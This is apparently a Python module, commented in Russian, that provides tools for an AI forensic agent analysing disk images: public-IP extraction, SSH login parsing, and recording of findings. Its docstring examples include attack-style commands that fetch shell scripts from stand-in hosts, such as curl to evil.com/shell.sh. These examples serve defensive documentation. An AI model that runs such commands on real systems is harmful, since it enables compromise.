"""
Investigation Tools — Инструменты для управления ходом расследования.

Содержит tools, специфичные для Deep Forensic Agent:
- extract_public_ips: Извлечение публичных IP-адресов из текста
- parse_ssh_successful_logins: Парсинг успешных SSH-входов из auth-логов
- get_investigation_context: Получение текущего контекста расследования
- record_finding: Запись подозрительной находки
- record_explored_path: Отметка исследованного пути

Эти инструменты используют глобальное хранилище состояния расследования
(InvestigationStore), которое синхронизируется с ForensicAgentState
оркестратора через sync_store_to_state().
"""

import json
import re
import uuid
import ipaddress
from typing import List, Dict, Any, Optional
from datetime import datetime
from langchain_core.tools import tool

from src.agent.state import InvestigatedPath, SuspiciousFinding
from src.utils.logger import get_logger

logger = get_logger("InvestigationTools")


# ==================== ГЛОБАЛЬНОЕ ХРАНИЛИЩЕ РАССЛЕДОВАНИЯ ====================
# Используется tools для записи/чтения данных расследования.
# Оркестратор синхронизирует это хранилище с ForensicAgentState
# через sync_store_to_state() в конце deep_analysis_node.

class InvestigationStore:
    """
    Глобальное хранилище данных расследования.
    
    Хранит только данные, которые накапливаются через tool-вызовы
    во время работы Deep Agent'а:
    - Исследованные пути (investigated_paths) — как InvestigatedPath dataclass
    - Подозрительные находки (suspicious_findings) — как SuspiciousFinding dataclass
    
    Поддерживает дельта-синхронизацию: метод get_new_since_last_sync()
    возвращает только элементы, добавленные с момента предыдущей
    синхронизации. Это критично для корректной работы с operator.add
    reducer в ForensicAgentState при итеративном анализе.
    
    Синхронизация с ForensicAgentState выполняется через
    sync_store_to_state() (определена в src.agent.state).
    """
    
    def __init__(self):
        self.investigated_paths: List[InvestigatedPath] = []
        self.suspicious_findings: List[SuspiciousFinding] = []
        # Водяные метки для дельта-синхронизации
        self._synced_paths_count: int = 0
        self._synced_findings_count: int = 0
    
    def reset(self):
        """Сбросить хранилище для нового расследования."""
        self.investigated_paths = []
        self.suspicious_findings = []
        self._synced_paths_count = 0
        self._synced_findings_count = 0
    
    def get_new_since_last_sync(self) -> Dict[str, Any]:
        """
        Вернуть только элементы, добавленные с момента предыдущей синхронизации.
        
        Продвигает водяные метки (_synced_*_count) вперёд, чтобы при
        следующем вызове вернуть только новую дельту.
        
        Используется sync_store_to_state() для корректной работы
        с operator.add reducer: каждая итерация deep_analysis_node
        дописывает только новые записи, а не весь накопленный массив.
        
        Returns:
            Dict с ключами 'investigated_paths' и 'suspicious_findings',
            содержащий только новые записи в виде словарей (.to_dict()).
        """
        new_paths = self.investigated_paths[self._synced_paths_count:]
        new_findings = self.suspicious_findings[self._synced_findings_count:]
        self._synced_paths_count = len(self.investigated_paths)
        self._synced_findings_count = len(self.suspicious_findings)
        return {
            'investigated_paths': [p.to_dict() for p in new_paths],
            'suspicious_findings': [f.to_dict() for f in new_findings],
        }
    
    def add_explored_path(self, path: str, description: str, suspicious: bool = False,
                          findings_refs: Optional[List[str]] = None) -> InvestigatedPath:
        """Добавить исследованный путь с дедупликацией.

        При совпадении path: объединяет описания, findings_refs,
        повышает suspicious если новый вызов помечен как suspicious.
        """
        findings_refs = findings_refs or []

        # Дедупликация по path
        for existing in self.investigated_paths:
            if existing.path == path:
                # Объединяем описание (если новое отличается)
                if description and description not in existing.description:
                    existing.description = f"{existing.description}; {description}"
                # OR suspicious
                if suspicious:
                    existing.suspicious = True
                # Объединяем findings_refs
                for ref in findings_refs:
                    if ref and ref not in existing.findings_refs:
                        existing.findings_refs.append(ref)
                logger.info(f"Дубликат пути '{path}' — объединено")
                return existing

        record = InvestigatedPath(
            path=path,
            description=description,
            suspicious=suspicious,
            findings_refs=findings_refs,
        )
        self.investigated_paths.append(record)
        return record
    
    def _find_duplicate(self, category: str, title: str) -> Optional[SuspiciousFinding]:
        """Найти дубликат находки по (category, normalized_title).

        Сравнение без учёта регистра и пробелов по краям.

        Returns:
            Существующий SuspiciousFinding если дубликат найден, иначе None.
        """
        norm_title = title.strip().lower()
        for f in self.suspicious_findings:
            if f.category == category and f.title.strip().lower() == norm_title:
                return f
        return None

    def add_finding(self, category: str, severity: str, title: str,
                    details: str, evidence: Optional[List[str]] = None,
                    related_paths: Optional[List[str]] = None,
                    related_findings: Optional[List[str]] = None) -> SuspiciousFinding:
        """Добавить подозрительную находку с дедупликацией.

        Проверяет дубликат по (category, title) без учёта регистра.
        При совпадении: объединяет evidence, related_paths, related_findings
        и повышает severity если новая находка более критична.
        Новая находка НЕ создаётся — возвращается существующая.
        """
        evidence = evidence or []
        related_paths = related_paths or []
        related_findings_list = related_findings or []

        # Дедупликация: поиск существующей находки с тем же (category, title)
        existing = self._find_duplicate(category, title)
        if existing:
            # Объединяем evidence
            for e in evidence:
                if e and e not in existing.evidence:
                    existing.evidence.append(e)
            # Объединяем related_paths
            for p in related_paths:
                if p and p not in existing.related_paths:
                    existing.related_paths.append(p)
            # Объединяем related_findings
            for rf in related_findings_list:
                if rf and rf not in existing.related_findings:
                    existing.related_findings.append(rf)
            # Повышаем severity если новая находка более критична
            _sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
            if _sev_order.get(severity, 5) < _sev_order.get(existing.severity, 5):
                existing.severity = severity
            logger.info(f"Дубликат находки [{category}] '{title}' — объединено с {existing.id}")
            return existing

        # Новая находка
        finding_id = f"FIND-{uuid.uuid4().hex[:8].upper()}"
        record = SuspiciousFinding(
            id=finding_id,
            category=category,
            severity=severity,
            title=title,
            details=details,
            evidence=evidence,
            related_paths=related_paths,
            related_findings=related_findings_list,
        )
        self.suspicious_findings.append(record)
        return record
    
    def get_explored_paths_list(self) -> List[str]:
        """Получить список уже исследованных путей."""
        return [p.path for p in self.investigated_paths]
    
    def get_findings_summary(self) -> Dict[str, int]:
        """Получить статистику по находкам."""
        summary: Dict[str, int] = {'total': len(self.suspicious_findings)}
        for f in self.suspicious_findings:
            sev = f.severity
            summary[sev] = summary.get(sev, 0) + 1
        return summary


# Синглтон хранилища
_investigation_store = InvestigationStore()


def get_investigation_store() -> InvestigationStore:
    """Получить глобальное хранилище расследования."""
    return _investigation_store


# ==================== RFC1918 / PUBLIC IP HELPERS ====================

# RFC1918 private ranges
_PRIVATE_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),       # loopback
    ipaddress.ip_network('169.254.0.0/16'),     # link-local
    ipaddress.ip_network('0.0.0.0/8'),          # current network
    ipaddress.ip_network('224.0.0.0/4'),        # multicast
    ipaddress.ip_network('255.255.255.255/32'), # broadcast
]

IP_RE = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')


def is_public_ip(ip_str: str) -> bool:
    """Проверить, является ли IP-адрес публичным (не RFC1918, не loopback и т.д.)."""
    try:
        addr = ipaddress.ip_address(ip_str)
        for net in _PRIVATE_NETWORKS:
            if addr in net:
                return False
        return True
    except ValueError:
        return False


# ==================== TOOLS ====================

@tool
def extract_public_ips(text: str) -> str:
    """
    Извлечь публичные (не приватные) IP-адреса из текста.
    
    Находит все IPv4 адреса в тексте, фильтрует приватные диапазоны
    (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16),
    loopback (127.0.0.0/8), link-local (169.254.0.0/16) и multicast.
    
    Используйте для:
    - Извлечения публичных IP из истории команд пользователей
    - Поиска внешних IP-адресов в конфигурациях и логах
    - Выявления потенциальных C2-серверов и внешних подключений
    
    Args:
        text: Текст для анализа (история команд, логи, конфигурации).
    
    Returns:
        JSON строка:
        - success: True
        - public_ips: Список уникальных публичных IP (отсортированный)
        - total_ips_found: Сколько всего IP найдено
        - total_public: Сколько из них публичных
        - private_ips: Список приватных IP (для справки)
        
    Example:
        >>> extract_public_ips("curl http://185.143.223.1/malware.sh && ping 192.168.1.1")
        '{"public_ips": ["185.143.223.1"], "total_public": 1, ...}'
    """
    all_ips = IP_RE.findall(text)
    
    # Валидация: каждый октет 0-255
    valid_ips = []
    for ip in all_ips:
        parts = ip.split('.')
        try:
            if all(0 <= int(p) <= 255 for p in parts):
                valid_ips.append(ip)
        except ValueError:
            continue
    
    public_ips = sorted(set(ip for ip in valid_ips if is_public_ip(ip)))
    private_ips = sorted(set(ip for ip in valid_ips if not is_public_ip(ip)))
    
    result = {
        "success": True,
        "public_ips": public_ips,
        "total_ips_found": len(set(valid_ips)),
        "total_public": len(public_ips),
        "private_ips": private_ips,
    }
    
    logger.info(f"extract_public_ips: found {len(public_ips)} public IPs out of {len(set(valid_ips))} total")
    return json.dumps(result, ensure_ascii=False)


@tool
def parse_ssh_successful_logins(auth_log_content: str) -> str:
    """
    Парсинг auth-логов для извлечения ТОЛЬКО успешных SSH-входов.
    
    Ищет записи вида:
    - "Accepted password for <user> from <ip> port <port>"
    - "Accepted publickey for <user> from <ip> port <port>"
    
    Используйте для:
    - Выявления внешних SSH-подключений к серверу
    - Определения, откуда заходили пользователи
    - Построения timeline доступа
    
    Args:
        auth_log_content: Содержимое auth.log (или нескольких объединённых).
    
    Returns:
        JSON строка:
        - success: True
        - logins: Список успешных входов [{timestamp, user, ip, port, method}, ...]
        - total_logins: Общее количество успешных входов
        - unique_users: Уникальные пользователи
        - unique_ips: Уникальные IP-адреса
        - summary_by_user: {user: count} 
        - summary_by_ip: {ip: count}
        
    Example:
        >>> parse_ssh_successful_logins("Jan 15 10:30:01 server sshd[1234]: Accepted password for admin from 203.0.113.5 port 22")
        '{"logins": [{"user": "admin", "ip": "203.0.113.5", ...}], "total_logins": 1}'
    """
    # Паттерны для успешных SSH-входов
    accepted_re = re.compile(
        r'(\w+\s+\d+\s+[\d:]+)\s+\S+\s+sshd\[\d+\]:\s+'
        r'Accepted\s+(password|publickey|keyboard-interactive)\s+'
        r'for\s+(\S+)\s+from\s+([\d.]+)\s+port\s+(\d+)',
        re.IGNORECASE
    )
    
    logins = []
    users_set = set()
    ips_set = set()
    summary_by_user: Dict[str, int] = {}
    summary_by_ip: Dict[str, int] = {}
    
    for line in auth_log_content.split('\n'):
        match = accepted_re.search(line)
        if match:
            timestamp_str, method, user, ip, port = match.groups()
            login_record = {
                'timestamp': timestamp_str.strip(),
                'user': user,
                'ip': ip,
                'port': int(port),
                'method': method,
            }
            logins.append(login_record)
            users_set.add(user)
            ips_set.add(ip)
            summary_by_user[user] = summary_by_user.get(user, 0) + 1
            summary_by_ip[ip] = summary_by_ip.get(ip, 0) + 1
    
    result = {
        "success": True,
        "logins": logins,
        "total_logins": len(logins),
        "unique_users": sorted(users_set),
        "unique_ips": sorted(ips_set),
        "summary_by_user": summary_by_user,
        "summary_by_ip": summary_by_ip,
    }
    
    logger.info(
        f"parse_ssh_successful_logins: {len(logins)} logins, "
        f"{len(users_set)} users, {len(ips_set)} IPs"
    )
    return json.dumps(result, ensure_ascii=False)


@tool
def get_investigation_context() -> str:
    """
    Получить текущий контекст расследования.
    
    Возвращает полную информацию о текущем состоянии расследования:
    - Какие пути уже исследованы (с описаниями)
    - Какие подозрительные находки сделаны
    - Статистику по находкам
    
    Используйте ПЕРЕД началом нового этапа анализа, чтобы понять:
    - Что уже было исследовано
    - Где найдены подозрительные артефакты
    - Куда стоит смотреть дальше
    
    Эта функция не требует аргументов.
    
    Returns:
        JSON строка с полным контекстом расследования:
        - explored_paths_count: Количество исследованных путей
        - explored_paths: Список {path, description, suspicious} для каждого пути
        - findings_count: Количество подозрительных находок
        - findings_summary: Статистика по severity (critical/high/medium/low)
        - findings: Список всех находок
        - explored_paths_list: Простой список исследованных путей (для быстрой проверки)
    """
    store = get_investigation_store()
    
    result = {
        "success": True,
        "explored_paths_count": len(store.investigated_paths),
        "explored_paths": [p.to_dict() for p in store.investigated_paths],
        "explored_paths_list": store.get_explored_paths_list(),
        "findings_count": len(store.suspicious_findings),
        "findings_summary": store.get_findings_summary(),
        "findings": [f.to_dict() for f in store.suspicious_findings],
    }
    
    logger.info(
        f"get_investigation_context: {result['explored_paths_count']} paths, "
        f"{result['findings_count']} findings"
    )
    return json.dumps(result, ensure_ascii=False)


@tool
def record_finding(
    category: str,
    severity: str,
    title: str,
    details: str,
    evidence: str = "[]",
    related_paths: str = "[]",
    related_findings: str = "[]"
) -> str:
    """
    Зафиксировать подозрительную находку в журнале расследования.
    
    Каждая находка получает уникальный идентификатор (FIND-XXXXXXXX).
    Находки могут быть связаны друг с другом через related_findings
    и с путями через related_paths.
    
    Категории находок:
    - file: Подозрительный файл (бэкдор, скрипт, бинарник)
    - command: Подозрительная команда в истории
    - service: Нестандартный/вредоносный сервис
    - network: Подозрительная сетевая активность (IP, порт, подключение)
    - user: Подозрительный пользователь / учётная запись
    - config: Подозрительная конфигурация
    - malware: Вредоносное ПО / инструмент хакера
    - persistence: Механизм закрепления (cron, автозагрузка)
    
    Уровни severity:
    - critical: Явное доказательство компрометации
    - high: Очень подозрительно, требует немедленного анализа
    - medium: Подозрительно, требует дополнительной проверки
    - low: Незначительная аномалия
    - info: Информационная заметка
    
    Args:
        category: Категория находки (file, command, service, network, user, config, malware, persistence)
        severity: Уровень (critical, high, medium, low, info)
        title: Краткое описание находки (одна строка)
        details: Подробное описание: что найдено, почему подозрительно, контекст
        evidence: JSON-массив строк с доказательствами (команды, строки файлов, логи).
                 Пример: '["curl http://evil.com/shell.sh", "chmod 777 /tmp/backdoor"]'
        related_paths: JSON-массив строк — связанные пути в образе.
                      Пример: '["/tmp/backdoor", "/etc/cron.d/evil"]'
        related_findings: JSON-массив строк — ID связанных находок.
                         Пример: '["FIND-A1B2C3D4"]'
    
    Returns:
        JSON строка с зарегистрированной находкой:
        - success: True
        - finding: Полная запись о находке с id
        - total_findings: Общее количество находок после добавления
    """
    store = get_investigation_store()
    
    # Парсим JSON-массивы
    try:
        evidence_list = json.loads(evidence) if isinstance(evidence, str) else evidence
    except (json.JSONDecodeError, TypeError):
        evidence_list = [evidence] if evidence else []
    
    try:
        paths_list = json.loads(related_paths) if isinstance(related_paths, str) else related_paths
    except (json.JSONDecodeError, TypeError):
        paths_list = [related_paths] if related_paths else []
    
    try:
        findings_list = json.loads(related_findings) if isinstance(related_findings, str) else related_findings
    except (json.JSONDecodeError, TypeError):
        findings_list = [related_findings] if related_findings else []
    
    finding = store.add_finding(
        category=category,
        severity=severity,
        title=title,
        details=details,
        evidence=evidence_list,
        related_paths=paths_list,
        related_findings=findings_list,
    )
    
    result = {
        "success": True,
        "finding": finding.to_dict(),
        "total_findings": len(store.suspicious_findings),
    }
    
    logger.info(f"record_finding: [{severity.upper()}] {title} -> {finding.id}")
    return json.dumps(result, ensure_ascii=False)


@tool
def record_explored_path(
    path: str,
    description: str,
    suspicious: bool = False,
    findings_refs: str = "[]"
) -> str:
    """
    Отметить путь в образе как исследованный с описанием результатов.
    
    Используйте ПОСЛЕ исследования каждого пути/каталога/файла в образе,
    чтобы отслеживать прогресс расследования. Это помогает избежать
    повторного исследования тех же путей и даёт контекст для LLM
    о том, что уже проверено.
    
    Args:
        path: Путь в образе диска (напр. "/etc/cron.d", "/home/user/.ssh")
        description: Описание того, что было найдено / что проверено.
                    Пример: "Проверены cron-задачи. Найдена подозрительная задача miner_update."
        suspicious: True если в данном пути найдено что-то подозрительное.
        findings_refs: JSON-массив ID находок, связанных с этим путём.
                      Пример: '["FIND-A1B2C3D4"]'
    
    Returns:
        JSON строка:
        - success: True
        - record: Запись об исследованном пути
        - total_explored: Общее количество исследованных путей
    """
    store = get_investigation_store()
    
    try:
        refs = json.loads(findings_refs) if isinstance(findings_refs, str) else findings_refs
    except (json.JSONDecodeError, TypeError):
        refs = []
    
    record = store.add_explored_path(
        path=path,
        description=description,
        suspicious=suspicious,
        findings_refs=refs,
    )
    
    result = {
        "success": True,
        "record": record.to_dict(),
        "total_explored": len(store.investigated_paths),
    }
    
    logger.info(f"record_explored_path: {path} (suspicious={suspicious})")
    return json.dumps(result, ensure_ascii=False)
